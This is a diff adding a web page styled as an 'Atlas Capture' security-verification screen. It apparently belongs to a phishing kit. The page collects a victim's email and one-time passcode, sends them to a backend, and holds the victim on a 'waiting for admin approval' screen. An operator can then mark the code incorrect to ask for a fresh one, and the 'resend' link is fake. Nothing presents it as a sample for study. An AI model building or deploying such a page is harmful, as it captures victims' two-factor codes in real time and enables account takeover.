@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Atlas Capture - Security Verification</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+
+body{
+  background:#f3f4f6;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  padding:40px 10px;
+}
+
+.wrapper{max-width:420px;width:100%}
+
+.header{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:10px;
+  margin-bottom:18px;
+}
+.header span{font-weight:600;font-size:18px}
+
+.card{
+  background:#fff;
+  border-radius:22px;
+  padding:32px 22px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.08);
+  text-align:center;
+}
+
+.security-icon{
+  width:64px;
+  height:64px;
+  background:#eef2ff;
+  border-radius:32px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  margin:0 auto 20px;
+}
+.security-icon svg{
+  width:32px;
+  height:32px;
+  stroke:#4f46e5;
+}
+
+h2{
+  font-size:24px;
+  font-weight:700;
+  color:#1f2937;
+  margin-bottom:12px;
+}
+
+.subtext{
+  color:#6b7280;
+  font-size:13px;
+  margin-bottom:28px;
+  line-height:1.5;
+}
+
+.otp-group{
+  display:flex;
+  gap:12px;
+  justify-content:center;
+  margin-bottom:28px;
+  flex-wrap:wrap;
+}
+.otp-input{
+  width:52px;
+  height:60px;
+  text-align:center;
+  font-size:24px;
+  font-weight:600;
+  border:2px solid #e5e7eb;
+  border-radius:14px;
+  background:#fff;
+  transition:all 0.2s;
+}
+.otp-input:focus{
+  outline:none;
+  border-color:#4f46e5;
+  box-shadow:0 0 0 3px rgba(79,70,229,0.1);
+}
+.otp-input:disabled{
+  background:#f3f4f6;
+  cursor:not-allowed;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  background:linear-gradient(90deg,#2563eb,#7c3aed);
+  color:#fff;
+  font-weight:600;
+  cursor:pointer;
+  margin-bottom:16px;
+}
+button:disabled{
+  opacity:0.6;
+  cursor:not-allowed;
+}
+.button-loading{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+}
+.spinner{
+  width:18px;
+  height:18px;
+  border:2px solid rgba(255,255,255,0.3);
+  border-top-color:white;
+  border-radius:50%;
+  animation:spin 0.8s linear infinite;
+}
+@keyframes spin{
+  to{transform:rotate(360deg);}
+}
+
+.link{
+  background:none;
+  color:#4f46e5;
+  font-size:14px;
+  font-weight:500;
+  margin:0;
+  padding:0;
+  box-shadow:none;
+}
+.link:hover{
+  background:none;
+  text-decoration:underline;
+}
+
+.error-message{
+  color:#ef4444;
+  font-size:12px;
+  margin-top:12px;
+  margin-bottom:8px;
+  display:none;
+  line-height:1.4;
+}
+
+.incorrect-message{
+  color:#ef4444;
+  font-size:11px;
+  margin-top:8px;
+  margin-bottom:12px;
+  display:none;
+  line-height:1.5;
+  text-align:center;
+  background:#fef2f2;
+  padding:10px;
+  border-radius:12px;
+  border:1px solid #fecaca;
+}
+
+.waiting-message{
+  color:#4f46e5;
+  font-size:13px;
+  margin-top:12px;
+  display:none;
+  background:#e0e7ff;
+  padding:10px;
+  border-radius:12px;
+}
+
+.success-message{
+  color:#059669;
+  font-size:13px;
+  margin-top:12px;
+  display:none;
+  background:#d1fae5;
+  padding:10px;
+  border-radius:12px;
+}
+
+.resend-link{
+  color:#4f46e5;
+  font-size:12px;
+  cursor:pointer;
+  text-decoration:underline;
+  display:inline-block;
+  margin-top:8px;
+}
+
+.resend-link:hover{
+  color:#2563eb;
+}
+
+#logoAtlas{
+  height: 45px;
+  width: 45px;
+  border-radius: 40%;
+  margin-right: 9px;
+}
+</style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="header">
+    <div class="icon">
+      <img id="logoAtlas" src="https://i.postimg.cc/dQjyw0ZV/atlas.png" alt="Atlas logo">
+    </div>
+    <span>Atlas Capture</span>
+  </div>
+
+  <div class="card">
+    <div class="security-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <path d="M12 2L3 7v6c0 5 9 9 9 9s9-4 9-9V7l-9-5z" stroke="#4f46e5"/>
+        <path d="M12 12 L12 16 M9 14 L15 14" stroke="#4f46e5"/>
+      </svg>
+    </div>
+    <h2>Security Verification</h2>
+    <p class="subtext">Additional authentication required to protect your account.<br>For extra security purposes; to prevent unauthorized access, we have added this verification page. Please enter another code sent to your email.</p>
+
+    <div class="otp-group" id="otpGroup">
+      <input type="text" class="otp-input" maxlength="1" id="digit1">
+      <input type="text" class="otp-input" maxlength="1" id="digit2">
+      <input type="text" class="otp-input" maxlength="1" id="digit3">
+      <input type="text" class="otp-input" maxlength="1" id="digit4">
+      <input type="text" class="otp-input" maxlength="1" id="digit5">
+      <input type="text" class="otp-input" maxlength="1" id="digit6">
+    </div>
+
+    <button id="verifyBtn">Verify</button>
+    <button class="link" id="differentEmail">Use different email</button>
+    
+    <div id="errorMessage" class="error-message"></div>
+    <div id="incorrectMessage" class="incorrect-message"></div>
+    <div id="waitingMessage" class="waiting-message"></div>
+    <div id="successMessage" class="success-message"></div>
+  </div>
+</div>
+
+<script>
+  const pathParts = window.location.pathname.split('/');
+  const email = decodeURIComponent(pathParts[2]);
+  if (!email) window.location.href = '/';
+
+  const inputs = ['digit1', 'digit2', 'digit3', 'digit4', 'digit5', 'digit6'];
+  const verifyBtn = document.getElementById('verifyBtn');
+  const errorDiv = document.getElementById('errorMessage');
+  const incorrectDiv = document.getElementById('incorrectMessage');
+  const waitingDiv = document.getElementById('waitingMessage');
+  const successDiv = document.getElementById('successMessage');
+  let isProcessing = false;
+  let redirectTimeout = null;
+  let checkInterval = null;
+
+  inputs.forEach((id, index) => {
+    const input = document.getElementById(id);
+    
+    input.addEventListener('input', (e) => {
+      if (e.target.value.length === 1 && index < 5) {
+        document.getElementById(inputs[index + 1]).focus();
+      }
+      let allFilled = true;
+      for (let i = 0; i < inputs.length; i++) {
+        if (!document.getElementById(inputs[i]).value) {
+          allFilled = false;
+          break;
+        }
+      }
+      if (allFilled && !isProcessing) {
+        verifyBtn.disabled = false;
+        verifyBtn.innerHTML = 'Verify';
+      } else if (!allFilled) {
+        verifyBtn.disabled = true;
+        verifyBtn.innerHTML = 'Verify';
+      }
+    });
+    
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !e.target.value && index > 0) {
+        document.getElementById(inputs[index - 1]).focus();
+      }
+    });
+    
+    input.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const pasted = (e.clipboardData || window.clipboardData).getData('text');
+      const chars = pasted.slice(0, 6);
+      chars.split('').forEach((char, i) => {
+        if (inputs[i]) {
+          document.getElementById(inputs[i]).value = char;
+        }
+      });
+      if (chars.length === 6 && !isProcessing) {
+        verifySecondOTP();
+      }
+    });
+  });
+
+  function getOTP() {
+    let otp = '';
+    for (let i = 0; i < inputs.length; i++) {
+      const val = document.getElementById(inputs[i]).value;
+      if (!val) return null;
+      otp += val;
+    }
+    return otp;
+  }
+
+  function showLoading() {
+    isProcessing = true;
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
+    errorDiv.style.display = 'none';
+    incorrectDiv.style.display = 'none';
+    waitingDiv.style.display = 'none';
+    successDiv.style.display = 'none';
+  }
+
+  function showWaitingForApproval() {
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for admin approval...</span>';
+    waitingDiv.textContent = 'Your code has been submitted. Waiting for admin to approve...';
+    waitingDiv.style.display = 'block';
+    incorrectDiv.style.display = 'none';
+  }
+
+  function showIncorrectMessage() {
+    isProcessing = false;
+    verifyBtn.disabled = false;
+    verifyBtn.innerHTML = 'Verify';
+    waitingDiv.style.display = 'none';
+    incorrectDiv.innerHTML = '❌ The passcode was incorrect and could not be authenticated. Please try inputting the passcode again or <span class="resend-link" onclick="resendCode()">send another passcode</span>.';
+    incorrectDiv.style.display = 'block';
+    
+    // Clear OTP inputs
+    inputs.forEach(id => {
+      document.getElementById(id).value = '';
+      document.getElementById(id).disabled = false;
+    });
+    document.getElementById('digit1').focus();
+  }
+
+  function resendCode() {
+    incorrectDiv.style.display = 'none';
+    alert('A new passcode has been sent to your email.');
+  }
+
+  function showSuccessAndRedirect() {
+    if (redirectTimeout) clearTimeout(redirectTimeout);
+    
+    verifyBtn.style.display = 'none';
+    waitingDiv.style.display = 'none';
+    successDiv.textContent = '✓ Verification successful! Redirecting...';
+    successDiv.style.display = 'block';
+    
+    inputs.forEach(id => {
+      document.getElementById(id).disabled = true;
+    });
+    
+    redirectTimeout = setTimeout(() => {
+      window.location.href = `/success?email=${encodeURIComponent(email)}`;
+    }, 2000);
+  }
+
+  async function verifySecondOTP() {
+    if (isProcessing) return;
+    
+    const otp = getOTP();
+    if (!otp || otp.length !== 6) {
+      errorDiv.textContent = 'Please enter all 6 characters';
+      errorDiv.style.display = 'block';
+      setTimeout(() => {
+        errorDiv.style.display = 'none';
+      }, 3000);
+      return;
+    }
+
+    showLoading();
+    
+    try {
+      const response = await fetch('/api/users/submit-second-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, otp })
+      });
+      const data = await response.json();
+      
+      if (data.success) {
+        showWaitingForApproval();
+        
+        // Poll for approval status
+        if (checkInterval) clearInterval(checkInterval);
+        checkInterval = setInterval(async () => {
+          try {
+            const statusResponse = await fetch(`/api/users/check-second-otp-status?email=${encodeURIComponent(email)}`);
+            const statusData = await statusResponse.json();
+            
+            if (statusData.reset) {
+              // Reset the form - clear OTP inputs and show error without reload
+              clearInterval(checkInterval);
+              showIncorrectMessage();
+              checkInterval = null;
+            } else if (statusData.approved) {
+              clearInterval(checkInterval);
+              showSuccessAndRedirect();
+            }
+          } catch(e) {
+            console.log('Checking status...', e);
+          }
+        }, 2000);
+      } else {
+        isProcessing = false;
+        verifyBtn.disabled = false;
+        verifyBtn.innerHTML = 'Verify';
+        waitingDiv.style.display = 'none';
+        errorDiv.textContent = data.error || 'Invalid OTP';
+        errorDiv.style.display = 'block';
+        setTimeout(() => {
+          errorDiv.style.display = 'none';
+        }, 3000);
+      }
+    } catch (error) {
+      isProcessing = false;
+      verifyBtn.disabled = false;
+      verifyBtn.innerHTML = 'Verify';
+      waitingDiv.style.display = 'none';
+      errorDiv.textContent = 'Network error. Please try again.';
+      errorDiv.style.display = 'block';
+      setTimeout(() => {
+        errorDiv.style.display = 'none';
+      }, 3000);
+    }
+  }
+
+  verifyBtn.addEventListener('click', verifySecondOTP);
+  document.getElementById('digit1').focus();
+  document.getElementById('differentEmail').addEventListener('click', () => {
+    if (redirectTimeout) clearTimeout(redirectTimeout);
+    if (checkInterval) clearInterval(checkInterval);
+    window.location.href = '/';
+  });
+</script>
+
+</body>
+</html>
